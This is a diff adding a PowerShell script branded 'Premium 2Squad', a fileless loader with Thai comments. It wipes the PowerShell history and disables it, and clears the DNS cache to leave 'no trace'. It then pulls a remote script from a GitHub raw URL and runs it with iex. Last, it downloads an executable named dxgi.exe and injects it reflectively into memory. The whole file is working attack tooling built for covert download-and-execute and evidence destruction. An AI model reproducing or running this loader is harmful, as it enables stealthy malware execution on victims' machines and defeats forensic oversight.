@@ -1,0 +1,72 @@
+# =========================================================================
+# PREMIUM 2SQUAD - FILELESS EXE LOADER (NATIVE C++)
+# =========================================================================
+$ErrorActionPreference = "SilentlyContinue"
+$host.UI.RawUI.WindowTitle = "PREMIUM 2SQUAD - LOADER"
+Clear-Host
+
+Write-Host ""
+Write-Host "        ___  ___  ___  _  __ __  _____  __  __ __ " -ForegroundColor Cyan
+Write-Host "       / _ \/ _ \/ __// |/ // / / /   |/ / / // / " -ForegroundColor Cyan
+Write-Host "      / ___/ , _/ _/ /    // /_/ / /| / /_/ // /_ " -ForegroundColor Cyan
+Write-Host "     /_/  /_/|_/___//_/|_/ \____/_/ |_/____//___/ " -ForegroundColor Cyan
+Write-Host "  ========================================================" -ForegroundColor DarkGray
+Write-Host "          P R E M I U M   2 S Q U A D   L O A D E R" -ForegroundColor White
+Write-Host "  ========================================================" -ForegroundColor DarkGray
+Write-Host ""
+
+# ==========================================
+# AUTO HISTORY CLEANUP & CLEAR LOCAL CACHE
+# ==========================================
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Wiping traces and clearing local cache..." -ForegroundColor White
+
+# เคลียร์ DNS Cache ของเครื่องเพื่อป้องกันการจำลิ้งก์เก่า
+Clear-DnsClientCache -ErrorAction SilentlyContinue
+
+$historyPath = (Get-PSReadLineOption).HistorySavePath
+if (Test-Path $historyPath) {
+    # ลบเนื้อหาไฟล์ประวัติ
+    Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue
+    # เคลียร์ประวัติในหน้าต่าง
+    Clear-History
+    # ปิดการเซฟประวัติ
+    Set-PSReadLineOption -HistorySaveStyle SaveNothing
+    
+    Start-Sleep -Milliseconds 500
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " System cleaned perfectly. No trace left." -ForegroundColor Green
+}
+Write-Host ""
+
+# ==========================================
+# FILELESS DOWNLOAD & EXECUTION (ANTI-CACHE SYSTEM)
+# ==========================================
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Connecting to secure server (Bypassing Cache)..." -ForegroundColor White
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# สร้างตัวเลขสุ่ม (Cache-Buster) เพื่อหลอกเซิร์ฟเวอร์ไม่ให้จำ Cache
+$RandomHash = Get-Random
+
+try {
+    # 1. โหลดเครื่องมือ Reflective PE (พ่วงตัวเลขสุ่มกัน Cache)
+    $InjectorURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/refs/heads/main/2squad.ps1"
+    iex (New-Object Net.WebClient).DownloadString($InjectorURL)
+
+    # 2. โหลดไฟล์ EXE ของคุณ (แก้เป็นลิ้งก์ Raw ของ dxgi.exe แล้ว)
+    $ExeURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/main/dxgi.exe?t=$RandomHash"
+    
+    $WebClient = New-Object System.Net.WebClient
+    $ExeBytes = $WebClient.DownloadData($ExeURL)
+    
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Payload ready ($($ExeBytes.Length) bytes)." -ForegroundColor Green
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Executing C++ Native Payload in memory..." -ForegroundColor White
+    
+    Start-Sleep -Seconds 2
+    
+    # 3. สั่งรัน EXE เข้า Memory ทันที
+    Invoke-ReflectivePEInjection -PEBytes $ExeBytes -ForceASLR
+    
+} catch {
+    Write-Host "`n  [!] Execution Failed: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "  [!] Make sure your C++ executable is compiled as 64-bit (x64)." -ForegroundColor Red
+}
